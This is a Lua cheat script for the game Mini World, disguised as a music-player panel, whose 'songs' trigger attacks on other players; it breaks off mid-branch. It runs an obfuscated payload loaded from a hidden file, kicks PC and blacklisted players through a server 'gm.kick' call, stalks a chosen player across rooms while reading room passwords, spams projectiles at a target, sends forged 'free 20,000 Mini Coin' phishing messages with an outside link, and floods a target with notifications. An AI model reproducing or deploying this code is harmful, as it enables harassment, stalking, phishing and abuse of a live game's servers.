ShowGameTipsWithoutFilter('Đã tải thành công')
local www_dir = LuaInterface and LuaInterface.geturl and LuaInterface:geturl():gsub('/$',''):gsub('/','_'):gsub(':', '_') .. '/' or ''
local StdioRoot = LuaInterface:getStdioRoot()
local prefix = StdioRoot .. '/'
filepath_root=prefix

--加载脚本
function load_msg(msg)
    local success, result = pcall(loadstring, msg)
    if success and type(result) == "function" then
        result()
    end
end

--判断功能是否开启
function os_load(ft,msgis,msgno)
    local base = filepath_root..'axdx/'..ft
    if gFunc_isStdioFileExist(base..'/1') then
        load_msg(msgis)
        gFunc_deleteFileByFullPath(base..'/1')
    elseif gFunc_isStdioFileExist(base..'/0') then
        load_msg(msgno)
        gFunc_deleteFileByFullPath(base..'/0')
    end
end

--读取指定路径文件内容
function readFile(ft)
    local filepath=filepath_root..'axdx/'..ft..'/text'
    local file = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

--读取指定路径脚本
function readFile_load()
    local filepath=filepath_root..'obj/com/b9c35f84c07647fd44b56ba7a30bfd34'
    local file = io.open(filepath, "r")
    if not file then return 'print(nil)' end
    local content = file:read("*a")
    file:close()

    local sm = 'Vg21WQ5KdRt0yNpcr9m4O3PoHaZvsLeCY8FjSwiTkUbuEBIJlAG7fqXM6xDnzh-;'
    local function s7decode(data)
        data = data:gsub(sm.."_", "=")
        return data:gsub('.', function(x)
            if x == '_' then return '' end
            local r,f='', sm:find(x)-1
            for i=6,1,-1 do
                r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
            end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if #x~=8 then return '' end
            local c=0
            for i=1,8 do
                c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
            end
            return string.char(c)
        end)
    end
    return s7decode(content)
end

-- 安全执行
function safelyExecute(func, ...)
    local ok, r1, r2 = pcall(func, ...)
    return ok and r1 or nil
end

-- 线程任务
threadpool:work(function()
    -- 下载
	local function run_embedded_decoded()
	local hjvip = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["1afdd486624e54dcb903315d1407ce35"] = true,
        ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,
}

local currentDeviceID = ClientMgr:getDeviceID() or GetClientInfo():getDeviceID()

if hjvip[currentDeviceID] then
    -- 标记是否已打开
    local uiOpened = false
    
    -- 先延迟2秒再启动（确保游戏完全加载）
    threadpool:delay(2, function()
        -- 立即打开一次
        if not GetInst("MiniUIManager"):IsShown("MiniClubPlayerAutoGen") then
            GetInst("MiniUIManager"):OpenUI("QQMusicPlayer", "miniui/miniworld/QQMusicPlayer", "MiniClubPlayerAutoGen")
            uiOpened = true
        end
        
        -- 注册UI调度器，持续监控
        GetInst("MiniUIScheduler"):regGloabel(function()
            -- 如果UI被关闭了，重新打开（不管在主页还是游戏里）
            if not GetInst("MiniUIManager"):IsShown("MiniClubPlayerAutoGen") then
                GetInst("MiniUIManager"):OpenUI("QQMusicPlayer", "miniui/miniworld/QQMusicPlayer", "MiniClubPlayerAutoGen")
                uiOpened = true
            end
        end, 2.0, 86400000, nil, false)  -- 每2秒执行，持续24小时
    end)
end



    
    
    
    
    local MiniClubPlayerCtrl, MiniClubPlayerModel, MiniClubPlayerView = GetInst("MiniUIManager"):GetMVC("MiniClubPlayerAutoGen")
    
    function MiniClubPlayerCtrl:OpenMusicPlayer()
	-- 打开你的 QQMusicTrigger 面板
	GetInst("MiniUIManager"):OpenUI("QQMusicTrigger", "miniui/miniworld/QQMusicPlayer", "QQMusicTriggerAutoGen", {callbackSelectMusic = callback})
end

-- 根据播放状态同步刷新悬浮球、播放面板界面
-- info：当前播放歌曲数据
-- state：播放状态枚举值
-- PLAYSTATE：播放状态枚举定义（播放/暂停/停止）
function MiniClubPlayerView:refreshPlayStateView(info, state, PLAYSTATE)
	-- 注释原生播放状态动画逻辑
	--[[
	if state == PLAYSTATE.PLAY and info then
		...省略代码...
	elseif state == PLAYSTATE.PAUSE then
		...省略代码...
	elseif state == PLAYSTATE.STOP and self.components then
		...省略代码...
	end
	]]

	-- 强制悬浮球永久转圈加载
	if self.components and self.components.buoyNode and not tolua.isnull(self.components.buoyNode) then
		self.components.buoyNode:SetLoading(true)
	end
end

function MiniClubPlayerView:EnableDragBuoy()
	if not self.widgets or not self.widgets.m_buoy then
		return
	end
	
	local buoy = self.widgets.m_buoy
	local isDragging = false
	local dragOffsetX = 0
	local dragOffsetY = 0
	local lastTouchX = 0
	local lastTouchY = 0
	local speedMultiplier = 1.5
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchBegin, function(obj, context)
		isDragging = true
		local touchPos = context:getPosition()
		local buoyPos = buoy:getPosition()
		dragOffsetX = touchPos.x - buoyPos.x
		dragOffsetY = touchPos.y - buoyPos.y
		lastTouchX = touchPos.x
		lastTouchY = touchPos.y
		context:preventDefault()
	end)
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchMove, function(obj, context)
		if isDragging then
			local touchPos = context:getPosition()
			local deltaX = (touchPos.x - lastTouchX) * speedMultiplier
			local deltaY = (touchPos.y - lastTouchY) * speedMultiplier
			local newX = buoy:getPosition().x + deltaX
			local newY = buoy:getPosition().y + deltaY
			buoy:setPosition(newX, newY)
			lastTouchX = touchPos.x
			lastTouchY = touchPos.y
			context:preventDefault()
		end
	end)
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchEnd, function(obj, context)
		if isDragging then
			isDragging = false
			-- ===== 松开吸附到最近的墙 =====
			self:SnapBuoyToWall()
			-- ==============================
		end
		context:preventDefault()
	end)
end

-------下面是悬浮窗

local QQMusicTriggerCtrl, QQMusicTriggerModel, QQMusicTriggerView = GetInst("MiniUIManager"):GetMVC("QQMusicTriggerAutoGen")
function QQMusicTriggerCtrl:Start()
local currentDeviceID = ClientMgr:getDeviceID() or GetClientInfo():getDeviceID() or ""
     -- 设备不在白名单，直接return，后面所有UI初始化代码都不会执行
     if not hjvip[currentDeviceID] then
         ShowGameTipsWithoutFilter("#cFF0000Thiết bị không có quyền, không thể mở bảng nhạc")
         return
     end
     -- 下面是你原有全部代码，无需改动
	-- 左侧分类栏配置：推荐歌单、最近播放
	self.define.leftInfos = {
		{
			title = "Khu chức năng ①", -- 多语言文本：推荐歌单
			type = self.model.LISTTYPE.RECOMMEND -- 分类标识：推荐列表
		},
		{
			title = "Khu chức năng ②", -- 多语言拼接：最近播放
			type = self.model.LISTTYPE.NEAR -- 分类标识：最近播放列表
		},
	}
	local param = {
		parent = self,
		model = self.model
	}
	self.model:InitData(param)
	self.view:InitUI(param)
	
	-- ===================== 手动控制最近播放 =====================
	local testSong = {
		song_id = 99980,
		song_name = "Kiểm tra",
		singer_name = "1",
		song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
		song_play_time = 180,
		playable = 1
	}
	
	local nearList = {}
	table.insert(nearList, 1, {song_id = 99980})
	self.model:SetMusicList(self.model.LISTTYPE.NEAR, nearList)
	self.model:AddDetailMusic(testSong)
	-- ================================================================
	
	-- ===================== 打开UI自动播放音乐 =====================
	
	-- ================================================================
end


function QQMusicTriggerCtrl:RequestRecommendList()
	if GetInst("QQMusicPlayerManager") then
		-- 读取全局推荐歌单基础ID列表
		local recommend_list = GetInst("QQMusicPlayerManager"):GetRecommendList()
		
		-- ===================== 新增测试歌曲 =====================
		-- 直接构造测试列表
		recommend_list = {"99999", "99998","99997"}
		
		-- 构造测试歌曲详情1
		local testSongInfo1 = {
			song_id = 99999,
			song_name = "Tự động đá người chơi PC",
			singer_name = "1",
			song_play_url = "https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png",
			song_play_time = 180,
			playable = 1
		}
		
		-- 构造测试歌曲详情2
		local testSongInfo2 = {
			song_id = 99998,
			song_name = "Chặn mã thiết bị",
			singer_name = "2",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo3 = {
			song_id = 99997,
			song_name = "Theo dõi hoàn toàn tự động",
			singer_name = "3",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo4 = {
			song_id = 99996,
			song_name = "Phi Lôi Thần xoay quanh",
			singer_name = "4",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo5 = {
			song_id = 99995,
			song_name = "Chặn chuyển sang trang web",
			singer_name = "5",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo6 = {
			song_id = 99994,
			song_name = "Chặn màn hình đen",
			singer_name = "6",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo7 = {
			song_id = 99993,
			song_name = "Chặn giao diện rương",
			singer_name = "7",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo8 = {
			song_id = 99992,
			song_name = "Gửi ảnh cho bạn bè",
			singer_name = "8",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo9 = {
			song_id = 99991,
			song_name = "Gửi tin nhắn từ xa",
			singer_name = "9",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo10 = {
			song_id = 99990,
			song_name = "Ép lập đội cấu hình thấp",
			singer_name = "10",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo10 = {
			song_id = 99989,
			song_name = "Làm đen màn hình từ xa",
			singer_name = "11",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		-- 关键：把测试歌曲添加到 model 的推荐列表中（和 recommend_list 保持一致）
		local musicList = {}
		table.insert(musicList, 1, {song_id = 99999})
		table.insert(musicList, 2, {song_id = 99998})
		table.insert(musicList, 3, {song_id = 99997})
		table.insert(musicList, 4, {song_id = 99996})
		table.insert(musicList, 5, {song_id = 99995})
		table.insert(musicList, 6, {song_id = 99994})
		table.insert(musicList, 7, {song_id = 99993})
		table.insert(musicList, 8, {song_id = 99992})
		table.insert(musicList, 9, {song_id = 99991})
		table.insert(musicList, 10, {song_id = 99990})
		table.insert(musicList, 11, {song_id = 99989})
		self.model:SetMusicList(self.model.LISTTYPE.RECOMMEND, musicList)
		
		-- 添加到详情缓存
		self.model:AddDetailMusic(testSongInfo1)
		self.model:AddDetailMusic(testSongInfo2)
		self.model:AddDetailMusic(testSongInfo3)
		self.model:AddDetailMusic(testSongInfo4)
		self.model:AddDetailMusic(testSongInfo5)
		self.model:AddDetailMusic(testSongInfo6)
		self.model:AddDetailMusic(testSongInfo7)
		self.model:AddDetailMusic(testSongInfo8)
		self.model:AddDetailMusic(testSongInfo9)
		self.model:AddDetailMusic(testSongInfo10)
		self.model:AddDetailMusic(testSongInfo11)
		-- ======================================================
		
		-- 直接刷新UI，传入 recommend_list（和 model 中的数据一致）
		self:RefreshMusicList(recommend_list, self.model.LISTTYPE.RECOMMEND)
	end
end






-- 用户点击添加歌曲到本地播放列表
function QQMusicTriggerCtrl:OnAddMusic(song_id, cmd)
	-- 测试歌曲直接播放
	
	
	if song_id == 99999 or song_id == "99999" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
-- 全局游戏事件统一回调函数，接收房间、互动、场景切换等服务器推送事

-- 进游戏自动检测并踢出电脑玩家
threadpool:work(function()
    threadpool:wait(1)
    
    function OpenGame_OnEvent()
	-- 拦截所有动作邀请相关网络推送，直接return不执行后续逻辑
	if arg1 == "GIE_UPDATE_ACTORINVITE" then
		return
	end

	-- 事件1：房主收到【等待房主开局】事件
	if arg1 == "GIE_WAITHOST_STARTGAME" and IsRoomOwner() then
		NeedOpenMakerRunGame = true
		getglobal("OpenGame"):Show()
	-- 事件2：房主收到【关闭开局面板】事件
	elseif arg1 == "GIE_CLOSE_HOST_STARTGAME" and IsRoomOwner() then
		NeedOpenMakerRunGame = false
		getglobal("OpenGame"):Hide()
	-- 事件3：收到他人发送的动作互动邀请（已被上方代码拦截，不再执行）
	elseif arg1 == "GIE_UPDATE_ACTORINVITE" then
		if GetInst("actionExpressionManager"):IsOpenNew() then
			GetInst("actionExpressionManager"):HangleUpdateActorInviteEvent()
		else
			local ge = GameEventQue:getCurEvent()
			local info = {
				targetUin = ge.body.actorInvite.targetuin,
				actId = ge.body.actorInvite.actId,
				inviteType = ge.body.actorInvite.inviteType,
				lastTime = MAX_ACTION_INVITE_TIME + os.time()
			}
			if info.inviteType == 0 then
				local refuseTime = getkv("ActorInviteRefuseTime" .. info.targetUin) or nil
				local timeSpace = 180
				local time = getServerTime() - timeSpace * 60
				if refuseTime and tonumber(refuseTime) > tonumber(time) then
					return
				end
				ShowGameTips(GetS(15292))
				getglobal("ActorInviteTipBtn"):Show()
				local Ani = getglobal("ActorInviteTipBtnAni")
				if Ani then
					local actInviteDef = getActInviteDefById(info.actId)
					if actInviteDef then
						local imgUrl = "ui/mobile/effect/ui_zbhz_" .. actInviteDef.ActID .. ".png"
						Ani:SetTexture(imgUrl, true)
						Ani:SetUVAnimation(120, true)
					end
				end
				isPlayingactorInviteAni = true
				if actorInviteTimer then
					threadpool:kick(actorInviteTimer)
				end
				actorInviteTimer = threadpool:delay(MAX_ACTION_INVITE_TIME, function()
					isPlayingactorInviteAni = false
					getglobal("ActorInviteTipBtn"):Hide()
				end)
				setActorInviteInfo(info)
			elseif info.inviteType == 1 then
				local uin = CurMainPlayer:getUin()
				local targetUin = info.targetUin
				CurMainPlayer:playSkinAct(info.actId, uin, targetUin)
			elseif info.inviteType == 2 then
				ShowGameTips(GetS(15289))
			elseif info.inviteType == 3 then
				ShowGameTips(GetS(15290))
			end
		end
	-- 事件4：大世界场景切换，上报埋点统计
	elseif arg1 == "GE_WORLD_CHANGE" then
		Report418Event(3)
	end
end







    
    while true do
        if CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame() then
            local myUin = AccountManager:getUin()
            local num = ClientCurGame:getNumPlayerBriefInfo()
            
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                
                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
                    local code, ret = BuddyManager:query_friend_info(briefInfo.uin)
                    
                    if code == ErrorCode.OK and ret and ret.baseinfo and ret.baseinfo.extra then
                        local deviceSystem = ret.baseinfo.extra.DeviceSystem or ""
                        
                        if deviceSystem == "windows" or deviceSystem == "Windows" then
                            local targetUin = briefInfo.uin
                            ShowGameTipsWithoutFilter("Phát hiện người chơi PC, Mini ID: " .. tostring(targetUin) .. ", đang đá ra...")
                            threadpool:wait(0.1)
                            -- 使用你提供的踢人方式
                            AccountManager.cluster.buddysvr.routemore('gm.kick', targetUin,0)
                        end
                    end
                end
            end
        end
        
        threadpool:wait(1)
    end
end)



		return
	end
	
	
	if song_id == 99998 or song_id == "99998" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
	-- 白名单 自行填写Uin
local whitelist = {}

-- 本地存储路径
local SAVE_PATH = "/storage/emulated/0/自动迷你lua/拉黑设备码本地检测.txt"

-- ========== 工具：读取本地黑名单（加异常捕获） ==========
local function GetLocalBlackDeviceList()
    local list = {}
    local ok, file = pcall(en, SAVE_PATH, "r")
    if not ok or not file then
        return list
    end
    for line in file:lines() do
        local deviceId = line:match("^%s*(.-)%s*$")
        if deviceId ~= "" then
            local repeatFlag = false
            for _, dev in ipairs(list) do
                if dev == deviceId then
                    repeatFlag = true
                    break
                end
            end
            if not repeatFlag then
                table.insert(list, deviceId)
            end
        end
    end
    file:close()
    return list
end

-- ========== 工具：保存设备到本地黑名单 ==========
local function SaveDeviceToLocalBan(targetDevice)
    local allList = GetLocalBlackDeviceList()
    local exist = false
    for _, dev in ipairs(allList) do
        if dev == targetDevice then
            exist = true
            break
        end
    end
    if exist then
        return false
    end
    table.insert(allList, targetDevice)
    local ok, file = pcall(io.open, SAVE_PATH, "w")
    if not ok or not file then
        ShowGameTipsWithoutFilter("#RThư mục không có quyền đọc/ghi!",3)
        return false
    end
    for _, dev in ipairs(allList) do
        file:write(dev .. "\n")
    end
    file:close()
    return true
end

-- 1. 选玩家添加设备黑名单
ShowPlayerList(function(targetUin)
    local code, ret = BuddyManager:query_friend_info(targetUin)
    if code ~= ErrorCode.OK or not ret or not ret.baseinfo or not ret.baseinfo.extra then
        ShowGameTipsWithoutFilter("#RKhông thể đọc thông tin thiết bị của người chơi", 3)
        return
    end
    local targetDevice = ret.baseinfo.extra.DeviceID or ""
    if targetDevice == "" then
        ShowGameTipsWithoutFilter("#RNgười chơi này không có ID thiết bị, không thể chặn", 3)
        return
    end
    local saveResult = SaveDeviceToLocalBan(targetDevice)
    local allBanList = GetLocalBlackDeviceList()
    local tipStr
    if saveResult then
        tipStr = "Đã chặn thiết bị:"..targetDevice.."\nTổng số trong danh sách đen:"..#allBanList
    else
        tipStr = "Thiết bị đã có trong danh sách đen\nTổng số:"..#allBanList
    end
    ShowGameTipsWithoutFilter(tipStr,4)
    GetClientInfo():clickCopy(tipStr)
end, "Chọn người chơi cần chặn")

-- 2. 后台循环检测（移除goto、全逻辑pcall容错）
threadpool:work(function()
    while true do
        local banDeviceList = GetLocalBlackDeviceList()
        if #banDeviceList > 0 then
            local ok, err = pcall(function()
                if not (CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame()) then
                    return
                end
                local myUin = AccountManager:getUin()
                local playerCount = ClientCurGame:getNumPlayerBriefInfo()
                for i = 1, playerCount do
                    local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                    if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
                        -- 白名单跳过
                        if not whitelist[briefInfo.uin] then
                            local code, ret = BuddyManager:query_friend_info(briefInfo.uin)
                            if code == ErrorCode.OK and ret and ret.baseinfo and ret.baseinfo.extra then
                                local curDevice = ret.baseinfo.extra.DeviceID or ""
                                if curDevice ~= "" then
                                    -- 匹配黑名单
                                    for _, banDev in ipairs(banDeviceList) do
                                        if curDevice == banDev then
                                            local kickUin = briefInfo.uin
                                            ShowGameTipsWithoutFilter("#RNgười chơi có thiết bị trong danh sách đen "..kickUin.." đã bị đá ra")
                                            AccountManager.cluster.buddysvr.routemore('gm.kick', kickUin, 0)
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not ok then
                print("检测玩家报错：", err)
            end
        end
        threadpool:wait(0.3) -- 放慢间隔，防止频繁查询服务器报错
    end
end)

	
	return
	end
	
	
	if song_id == 99997 or song_id == "99997" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
	ShowTextInputSafe(function(text)
    local raw_Uin = text
    local roomID = ""
    local hostPassword = ""
    local num_Uin = tonumber(raw_Uin)
    local query_Uin
    
    if num_Uin then
        query_Uin = num_Uin < 1000000000 and (num_Uin + 1000000000) or num_Uin
    else
        query_Uin = raw_Uin
    end
    
    ShowGameTipsWithoutFilter("Bắt đầu theo dõi người chơi: " .. tostring(query_Uin))
    
    local isEntering = false
    local isTracking = true
    
    threadpool:work(function()
        while true do
            -- 如果正在进入房间，等待进入完成，不执行任何追踪
            if isEntering then
                threadpool:wait(1)
                if CurWorld and CurMainPlayer then
                    isEntering = false
                    isTracking = false
                    ShowGameTipsWithoutFilter("Đã vào phòng, dừng theo dõi và bắt đầu kiểm tra mục tiêu...")
                end
                threadpool:wait(1)
            else
                -- 如果已经在房间里，检测目标是否还在
                if CurWorld and CurMainPlayer then
                    local myUin = AccountManager:getUin()
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    local targetInRoom = false
                    
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin == query_Uin then
                            targetInRoom = true
                            break
                        end
                    end
                    
                    if not targetInRoom then
                        ShowGameTipsWithoutFilter("Mục tiêu không ở trong phòng, rời đi và theo dõi lại...")
                        AccountManager.cluster.buddysvr.routemore('gm.kick', myUin, 0)
                        threadpool:wait(0.5)
                        isTracking = true
                        ShowGameTipsWithoutFilter("Bắt đầu theo dõi lại...")
                    end
                    threadpool:wait(3)
                else
                    -- 不在房间里，只做后台追踪，不加载任何界面
                    if isTracking then
                        local ret, data = BuddyManager:query_friend_info(query_Uin, true)
                        if ret == 0 and type(data) == "table" then
                            local statusinfo = data.statusinfo or {}
                            local newRoomID = tostring(statusinfo[2] or "")
                            local roominfo_str = statusinfo[3]
                            
                            if newRoomID ~= "" then
                                local password = ""
                                if type(roominfo_str) == "string" and roominfo_str ~= "" then
                                    local f, err = loadstring("return " .. roominfo_str)
                                    if f then
                                        local ok, roominfo = pcall(f)
                                        if ok and type(roominfo) == "table" then
                                            password = roominfo.hostPassword or ""
                                        end
                                    end
                                end
                                
                                ShowGameTipsWithoutFilter("Đã tìm thấy ID phòng: " .. newRoomID .. " Mật khẩu:" .. password)
                                
                                -- 标记进入中，此时不会再执行追踪
                                isEntering = true
                                
                                -- 进入房间
                                FriendChat_ReqFriendRoomByUin(raw_Uin, nil, true, true)
                                
                                local roomDesc = GetInst("RoomService"):ReqQuickUpPlayerRoomInfo(raw_Uin)
                                if roomDesc then
                                    roomDesc.lcl_outTime = os.time() + 1
                                    GetInst("RoomService"):EnterRoomByDesc(0, false, roomDesc)
                                    ShowGameTipsWithoutFilter("Đang vào phòng...")
                                else
                                    -- 联机失败，尝试云服
                                    local roomSrv = GetInst("RoomService")
                                    if roomSrv and roomSrv.EnterRoomById then
                                        roomSrv:EnterRoomById(newRoomID, password)
                                        ShowGameTipsWithoutFilter("Chế độ máy chủ đám mây: đang vào phòng...")
                                    else
                                        ShowGameTipsWithoutFilter("Không thể vào phòng, tiếp tục theo dõi...")
                                        isEntering = false
                                    end
                                end
                            else
                                -- 目标不在房间，安静追踪，不打印
                            end
                        end
                    end
                    threadpool:wait(20)
                end
            end
        end
    end)
end)
return
	end
	
	
if song_id == 99996 or song_id == "99996" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
ShowPlayerList(function(uin)
    -- 获取目标玩家实例
    local targetPlayer = ClientCurGame:getPlayerByUin(uin)
    if not targetPlayer then
        print("找不到目标玩家uin：" .. uin)
        return
    end

    -- 固定环绕半径
    local radius = 4
    -- 360度分段，每10度瞬移一次，一圈36段
    local stepAngle = 80
    -- 循环持续环绕
    for angle = 0, 999999 do
        threadpool:wait(0.00000000888888888001) -- 瞬移间隔，越小速度越快
        -- 获取目标原始坐标
        local oriX, oriY, oriZ = targetPlayer:getPosition(0, 0, 0)
        local baseX = oriX / 100
        local baseY = oriY / 100
        local baseZ = oriZ / 100

        -- 当前弧度
        local rad = math.rad((angle * stepAngle) % 360)
        -- 圆周环绕计算X、Z平面（Y保持高度不变）
        local new_x = baseX + math.cos(rad) * radius
        local new_z = baseZ + math.sin(rad) * radius
        local new_y = baseY

        -- 强制目标玩家第一人称视角
        local tdata1 = {}
        tdata1[1] = "player";
        tdata1[2] = "changeViewMode";
        tdata1[3] = {uin, 0, true}
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)

        -- 自身瞬移到环绕点位
        local selfUin = AccountManager:getUin()
        local tdata2 = {}
        tdata2[1] = "player";
        tdata2[2] = "setPosition";
        tdata2[3] = {selfUin, new_x, new_y, new_z}
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
        
        local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                                local neww_x, neww_y, neww_z = my_x / 100, my_y / 100, my_z / 100
                                
                                -- 发射投掷物（火龙果）
                                local tdata3 = {
                                    [1] = "world",
                                    [2] = "spawnProjectile",
                                    [3] = {selfUin, 15508, neww_x, neww_y, neww_z, new_x, new_y, new_z, 500}
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3)

        -- 打印当前角度与坐标，方便调试
        print("环绕角度：", (angle * stepAngle) % 360, "坐标", new_x, new_y, new_z)
    end
end, "Phi Lôi Thần xoay quanh")
return
	end
	
	
	if song_id == 99995 or song_id == "99995" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
		-- 黑名单链接关键词
function g_openBrowserUrlAuth(AAA)
ShowGameTipsWithoutFilter("Đã chặn chuyển sang trang web")
end
return
	end
		


	if song_id == 99994 or song_id == "99994" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

function GoToMainMenu(AAA)
	ShowGameTipsWithoutFilter("#RThông báo: đã chặn màn hình đen từ xa")
end

function AccRideChangeBtn_OnClick()--按钮点击事件
GetClientGameManagerPtr():gotoGame("MainMenuStage")
end
threadpool:work(function()
    threadpool:wait(1)
while true do
getglobal("AccRideChangeBtn"):Show()--显示按钮
threadpool:wait(1)
end
end
)
return
	end
	
	
		if song_id == 99993 or song_id == "99993" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")
function OpenCraftUIByBlockId(AAA)
	ShowGameTipsWithoutFilter("Đã chặn")
end


return
	end



	if song_id == 99992 or song_id == "99992" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")


ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            local src_uin = AccountManager:getUin()
local des_uin = target
local text = "Do bạn thể hiện tốt, hệ thống quyết định tặng bạn 20.000 Mini Coin, mong bạn tiếp tục phát huy"
local showType = 2

local cur_time = os.time()
local s2_, s2t_, pure_s2t_ = get_login_sign()
local token = gFunc_getmd5(""..cur_time..s2_..src_uin)
local auth = gFunc_getmd5(""..src_uin..s2_..cur_time) -- 官方最常用格式

local tShareParams = {
    nickname = "",
    shareType = 9,
    imageUrl = "https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png",
    url = "https://cn4.91kpz.com/short/label_related_list/otDa4t6lDDQ=",
    title = "Tặng bạn 20.000 Mini Coin",
    content = "Do bạn thể hiện tốt, hệ thống quyết định tặng bạn 20.000 Mini Coin, mong bạn tiếp tục phát huy"
}

local jsonExtendData = JSON:encode(tShareParams)
local base64_encode_jsonStr = ns_http.func.base64_encode(jsonExtendData)
local encode_jsonStr = ns_http.func.url_encode(base64_encode_jsonStr)

local url = "http://friend.miniworldgame.com:8180/server/friend"
    .. "?apiid=303"
    .. "&cmd=send_chat_msg"
    .. "&country=HK"
    .. "&des_uin=" .. des_uin
    .. "&extend_data=" .. encode_jsonStr
    .. "&lang=2"
    .. "&msg=" .. ns_http.func.url_encode(text)
    .. "&s2t=" .. pure_s2t_
    .. "&src_uin=" .. src_uin
    .. "&time=" .. cur_time
    .. "&token=" .. token
    .. "&uin=" .. src_uin
    .. "&ver=1.7.15"
    .. "&msgtype=1"
    .. "&pushchannel=1"
    .. "&auth=" .. auth
    .. "&mmsum=" .. AccountManager:getmmsum()
    .. "&cthash=" .. AccountManager:getUin() .. g_login_pure_s2t


-- 发送
ShowLoadLoopFrame(true)
ns_http.func.rpc_string_raw(url, function(ret) end, {
    src_uin = src_uin,
    des_uin = des_uin,
    show_type = showType
})
ShowGameTipsWithoutFilter("Đã gửi cho bạn bè", 3)
        
    end, "Nhập Mini ID")


return
	end



	if song_id == 99991 or song_id == "99991" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

ShowTextInputSafe(function(uinText)
    -- 校验迷你号合法性
    local rawUin = tonumber(uinText)
    if not rawUin or rawUin <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
        return
    end

    -- 自动补全至10位数字
    local uinStr = tostring(rawUin)
    local len = #uinStr
    if len == 7 then
        uinStr = "100" .. uinStr
    elseif len == 8 then
        uinStr = "10" .. uinStr
    elseif len == 9 then
        uinStr = "1" .. uinStr
    end
    local targetUin = tonumber(uinStr)

    -- 第一层校验成功，弹出第二层输入框填写发送文字
    ShowTextInputSafe(function(msgText)
        -- 校验文字非空
        if msgText == "" then
            ShowGameTipsWithoutFilter("#cff0000Nội dung nhập không được để trống", 3)
            return
        end
        -- 文字自动包裹双引号
        local wrapText = "\"" .. msgText .. "\""

        -- 组装推送消息数据包
        local info = {
            Text = wrapText,
            Type = "NotifyTips",
            ExceptIds = 1000
        }

        -- 修复错误：routemore 第二个参数必须字符串，单发改用 route
        for a=0,100000 do 
    threadpool:wait(0.1)
        AccountManager:routemore("teamservice.notifyMember", targetUin, info)
        end
        ShowGameTipsWithoutFilter("#c00ff00Gửi thành công! UIN 10 chữ số của mục tiêu:"..targetUin.." Nội dung:"..wrapText, 3)
    end, "Nhập nội dung văn bản cần gửi")

end, "Nhập Mini ID mục tiêu (7/8/9 chữ số sẽ tự động bổ sung thành 10 chữ số)")
return
	end

	if song_id == 99990 or song_id == "99990" then
		-- 功能4：关闭面板
